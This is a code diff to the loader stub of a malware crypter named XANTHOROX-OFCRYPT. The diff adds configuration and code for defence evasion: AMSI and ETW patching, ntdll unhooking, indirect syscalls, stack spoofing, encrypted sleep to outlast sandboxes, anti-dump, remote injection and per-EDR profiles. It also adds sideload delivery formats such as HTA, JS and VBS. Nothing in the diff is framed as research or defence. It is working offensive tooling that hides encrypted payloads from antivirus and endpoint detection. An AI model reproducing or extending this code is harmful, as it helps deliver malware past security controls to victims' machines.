@@ -36,61 +36,76 @@
 // ═══════════════════════════════════════════════════════════════
 //  XANTHOROX-OFCRYPT STUB | CONFIGURATION BLOCK
 //  The Builder patches these values at build time.
-//  StubConfig = 32 bytes: 23 bools + 1 encAlgorithm + 1 researchPkg + 7 pad
+//  StubConfig = 44 bytes: 1 version + 35 bools + 1 sideloadFmt + 1 encAlgo + 1 resPkg + 5 pad
 // ═══════════════════════════════════════════════════════════════
 
 struct StubConfig {
-    // Existing toggles (14)
+    unsigned char version;           // 0x02 for premium layout
+
     bool bAntiDebug;
     bool bAntiVM;
     bool bAntiSandbox;
-    bool bAMSI;
-    bool bETW;
+    bool bPatchlessAmsiEtw;        // merges old bAMSI + bETW
     bool bFibers;
     bool bRunPE;
     bool bModuleStomp;
     bool bPersist;
     bool bMelt;
     bool bFakeError;
-    bool bSleepObf;
+    bool bEkkoSleep;               // replaces bSleepObf
     bool bPPIDSpoof;
     bool bEntropyNorm;
-    // L11-L16 toggles (6)
-    bool bSyscalls;      // L11: Direct Syscalls
-    bool bThreadPool;    // L12: Thread Pool Execution
-    bool bGuardPage;     // L14: Guard Page Payload Shield
-    bool bHWIDBind;      // L15: HWID-Bound Key Derivation
-    bool bPhantomDLL;    // L16: Phantom DLL Hollowing
-    bool bCallbackDiv;   // L16b: Callback Diversification
-    // L21-L40 toggles (3 stub-side)
-    bool bMotwStrip;     // L21: MOTW Strip + Relaunch
-    bool bAntiEmulation; // L22: Anti-Emulation
-    bool bStagedLoad;    // L39: Staged Payload Decryption
-    // Remaining
-    unsigned char encAlgorithm;   // 0=AES, 1=ChaCha, 2=RC4, 3=XOR
-    unsigned char researchPackage; // 0=None, 1=Ghost, 2=Neuro, 3=Darknet
-    char pad[7];                  // Alignment padding to 32 bytes total
+    bool bIndirectSyscalls;        // replaces bSyscalls
+    bool bThreadPool;
+    bool bGuardPage;
+    bool bHWIDBind;
+    bool bPhantomDLL;
+    bool bCallbackDiv;
+    bool bMotwStrip;
+    bool bAntiEmulation;
+    bool bStagedLoad;
+
+    bool bKnownDllsUnhook;
+    bool bStackSpoof;
+    bool bAntiMemScan;
+    bool bRemoteInjection;
+    bool bDotNetLoading;
+    bool bThreadNormalization;
+    bool bSideloadFormat;
+    bool bBuildRandomization;
+    bool bAntiDump;
+    bool bCfgBypass;
+    bool bDllUnlink;
+    bool bPerEdrProfile;
+    bool bStagedDelivery;
+
+    unsigned char sideloadFormatType; // 0=EXE,1=CPL,2=XLL,3=MSI,4=HTA,5=JS,6=VBS
+    unsigned char encAlgorithm;       // 0=AES,1=ChaCha,2=RC4,3=XOR
+    unsigned char researchPackage;    // 0=None,1=Ghost,2=Neuro,3=Darknet
+    char pad[5];                      // Alignment to 44 bytes total
 };
+
+static_assert(sizeof(StubConfig) == 44, "StubConfig must be 44 bytes");
 
 // Sentinel markers for Builder patching
 #pragma section(".xthrx", read, write)
 __declspec(allocate(".xthrx")) char CONFIG_MARKER[8]    = "XCONFIG";
-__declspec(allocate(".xthrx")) StubConfig GlobalConfig   = { 
+__declspec(allocate(".xthrx")) StubConfig GlobalConfig   = {
+    0x02,   // version
     true,   // AntiDebug
     true,   // AntiVM
     false,  // AntiSandbox
-    true,   // AMSI
-    true,   // ETW
+    true,   // PatchlessAmsiEtw
     true,   // Fibers
     false,  // RunPE
     false,  // ModuleStomp
     false,  // Persist
     false,  // Melt
     false,  // FakeError
-    false,  // SleepObf
+    false,  // EkkoSleep
     false,  // PPIDSpoof
     false,  // EntropyNorm
-    false,  // Syscalls
+    false,  // IndirectSyscalls
     false,  // ThreadPool
     false,  // GuardPage
     false,  // HWIDBind
@@ -99,9 +114,23 @@ __declspec(allocate(".xthrx")) StubConfig GlobalConfig   = {
     false,  // MotwStrip
     false,  // AntiEmulation
     false,  // StagedLoad
+    false,  // KnownDllsUnhook
+    false,  // StackSpoof
+    false,  // AntiMemScan
+    false,  // RemoteInjection
+    false,  // DotNetLoading
+    false,  // ThreadNormalization
+    false,  // SideloadFormat
+    false,  // BuildRandomization
+    false,  // AntiDump
+    false,  // CfgBypass
+    false,  // DllUnlink
+    false,  // PerEdrProfile
+    false,  // StagedDelivery
+    0,      // sideloadFormatType (EXE)
     3,      // encAlgorithm (XOR default)
     0,      // researchPackage (None)
-    {0}
+    {0}     // padding
 };
 
 __declspec(allocate(".xthrx")) char KEY_MARKER[8]       = "XKEYBLK";
@@ -120,6 +149,14 @@ __declspec(allocate(".xthrx")) unsigned char EncryptedPayload[512 * 1024] = { 0 
 __declspec(allocate(".xthrx")) char RESEARCH_MARKER[8]   = "XRESRC\0";
 __declspec(allocate(".xthrx")) DWORD ResearchParamSize    = 0;
 __declspec(allocate(".xthrx")) unsigned char ResearchParams[5120] = { 0 };  // Max 5KB for S-boxes + params
+
+__declspec(allocate(".xthrx")) char SPOOF_MARKER[8]    = "XSPOOF";
+__declspec(allocate(".xthrx")) DWORD SpoofGadgetCount   = 0;
+__declspec(allocate(".xthrx")) unsigned char SpoofGadgets[512] = { 0 };
+
+__declspec(allocate(".xthrx")) char GADGET_MARKER[8]   = "XGADGT";
+__declspec(allocate(".xthrx")) DWORD IndirectGadgetCount = 0;
+__declspec(allocate(".xthrx")) unsigned char IndirectGadgets[256] = { 0 };
 
 
 // ═══════════════════════════════════════════════════════════════
@@ -160,15 +197,16 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLi
     Unhook::RefreshNtdll();
 
     // ── Step 1b: Initialize Direct Syscalls ──
-    if (GlobalConfig.bSyscalls)
+    if (GlobalConfig.bIndirectSyscalls)
         Syscall::Init();
 
     // ── Step 2: Telemetry Killers ──
-    if (GlobalConfig.bAMSI)
+    if (GlobalConfig.bPatchlessAmsiEtw) {
+        // M2: PatchlessBypass::EnableAmsiBypass() / EnableEtwBypass()
+        // Fallback until M2: keep byte-patching as interim
         Telemetry::PatchAMSI();
-    if (GlobalConfig.bETW) {
         Telemetry::PatchETW();
-        Telemetry::PatchETW_TI(); // L13: ETW Threat Intelligence
+        Telemetry::PatchETW_TI();
     }
 
     // ── Step 3: Anti-Analysis ──
@@ -186,7 +224,7 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLi
     }
 
     // ── Step 4: Sleep Obfuscation (initial delay to outlast sandboxes) ──
-    if (GlobalConfig.bSleepObf) {
+    if (GlobalConfig.bEkkoSleep) {
         // 8-second encrypted sleep — payload stays encrypted in memory
         // so scanners can't find it during the delay
         SleepObf::EncryptedSleep(EncryptedPayload, PayloadSize, 8000);
